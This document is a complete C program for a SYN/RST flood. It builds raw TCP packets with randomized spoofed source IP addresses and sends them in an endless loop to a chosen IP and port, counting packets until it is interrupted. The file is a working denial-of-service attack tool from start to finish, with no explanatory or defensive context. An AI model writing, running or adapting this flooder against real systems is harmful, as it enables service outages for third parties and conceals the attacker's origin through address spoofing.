#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_IP        "127.0.0.1"
#define DEFAULT_PORT      80
#define DATAGRAM_SIZE     4096
#define DEFAULT_WINDOW    5840
#define TTL_VALUE         255
#define PACKET_ID         54321

struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
    struct tcphdr tcp;
};

static volatile sig_atomic_t g_sending      = 1;
static volatile sig_atomic_t g_packet_count = 0;

typedef struct {
    char dst_ip[INET_ADDRSTRLEN];
    int  dst_port;
    int  flag_syn;
    int  flag_rst;
} FloodConfig;


static void print_usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s [options]\n"
        "  -t <ip>    Destination IP      (Default: %s)\n"
        "  -p <port>  Destination port    (Default: %d)\n"
        "  -r         Use the RST flag       (Default: SYN)\n"
        "  -h         View this help\n",
        prog, DEFAULT_IP, DEFAULT_PORT);
}

static int rand_octet(void) { return rand() % 256; }

static uint16_t rand_port(void) { return (uint16_t)(1024 + rand() % 64511); }

static void rand_ip(char *buf, size_t len)
{
    snprintf(buf, len, "%d.%d.%d.%d",
             rand_octet(), rand_octet(), rand_octet(), rand_octet());
}

static int valid_ip(const char *ip)
{
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &sa.sin_addr) == 1;
}

static unsigned short checksum(const unsigned short *ptr, int nbytes)
{
    long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        unsigned short odd = 0;
        *((unsigned char *)&odd) = *(const unsigned char *)ptr;
        sum += odd;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

static void sigint_handler(int sig)
{
    (void)sig;
    g_sending = 0;
    const char msg[] = "\n[INFO] Interrupted.\n";
    write(STDERR_FILENO, msg, sizeof(msg) - 1);
}

static int parse_args(int argc, char *argv[], FloodConfig *cfg)
{
    int opt;
    snprintf(cfg->dst_ip, sizeof(cfg->dst_ip), "%s", DEFAULT_IP);
    cfg->dst_port = DEFAULT_PORT;
    cfg->flag_syn = 1;
    cfg->flag_rst = 0;

    while ((opt = getopt(argc, argv, "t:p:rh")) != -1) {
        switch (opt) {
        case 't':
            snprintf(cfg->dst_ip, sizeof(cfg->dst_ip), "%s", optarg);
            if (!valid_ip(cfg->dst_ip)) {
                fprintf(stderr, "[ERROR] Invalid IP address: %s\n", optarg);
                return -1;
            }
            break;
        case 'p':
            cfg->dst_port = (int)strtol(optarg, NULL, 10);
            if (cfg->dst_port < 1 || cfg->dst_port > 65535) {
                fprintf(stderr, "[ERROR] Invalid port: %s\n", optarg);
                return -1;
            }
            break;
        case 'r':
            cfg->flag_rst = 1;
            cfg->flag_syn = 0;
            break;
        case 'h':
            print_usage(argv[0]);
            exit(0);
        default:
            print_usage(argv[0]);
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    FloodConfig cfg;
    if (parse_args(argc, argv, &cfg) < 0)
        return 1;

    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    struct sigaction sa = {0};
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGINT, &sa, NULL) < 0) {
        perror("[ERROR] sigaction");
        return 1;
    }

    /* Cria raw socket */
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        fprintf(stderr, "[ERROR] socket: %s\n"
                        "Execute as root/administrator.\n",
                strerror(errno));
        return 1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "[ERROR] setsockopt IP_HDRINCL: %s\n", strerror(errno));
        close(sock);
        return 1;
    }

    char datagram[DATAGRAM_SIZE];
    memset(datagram, 0, sizeof(datagram));

    struct iphdr       *iph  = (struct iphdr *)datagram;
    struct tcphdr      *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct pseudo_header psh;

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(cfg.dst_ip);

    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->frag_off = 0;
    iph->ttl      = TTL_VALUE;
    iph->protocol = IPPROTO_TCP;
    iph->daddr    = dst.sin_addr.s_addr;

    tcph->dest   = htons((uint16_t)cfg.dst_port);
    tcph->doff   = 5;
    tcph->syn    = cfg.flag_syn;
    tcph->rst    = cfg.flag_rst;
    tcph->window = htons(DEFAULT_WINDOW);

    psh.dst_addr    = dst.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol    = IPPROTO_TCP;
    psh.tcp_length  = htons(sizeof(struct tcphdr));

    printf("[INFO] Starting the flood → %s:%d  flag=%s\n",
           cfg.dst_ip, cfg.dst_port, cfg.flag_rst ? "RST" : "SYN");
    printf("[INFO] Press Ctrl+C to stop.\n\n");

    time_t last_print = time(NULL);

    while (g_sending) {
        char src_ip[INET_ADDRSTRLEN];
        rand_ip(src_ip, sizeof(src_ip));

        iph->saddr = inet_addr(src_ip);
        iph->id    = htons((uint16_t)rand());
        iph->check = 0;
        iph->check = checksum((unsigned short *)datagram,
                              ntohs(iph->tot_len) / 2);

        tcph->source  = htons(rand_port());
        tcph->seq     = htonl((uint32_t)rand());
        tcph->ack_seq = 0;
        tcph->check   = 0;

        psh.src_addr = iph->saddr;
        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)&psh,
                               sizeof(struct pseudo_header));

        if (sendto(sock, datagram, ntohs(iph->tot_len), 0,
                   (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            fprintf(stderr, "[ERROR] sendto: %s\n", strerror(errno));
            break;
        }

        g_packet_count++;

        time_t now = time(NULL);
        if (now != last_print) {
            printf("\r[STAT] Packages sent: %d   ", (int)g_packet_count);
            fflush(stdout);
            last_print = now;
        }
    }

    printf("\n[INFO] Total packages sent: %d\n", (int)g_packet_count);
    close(sock);
    return 0;
}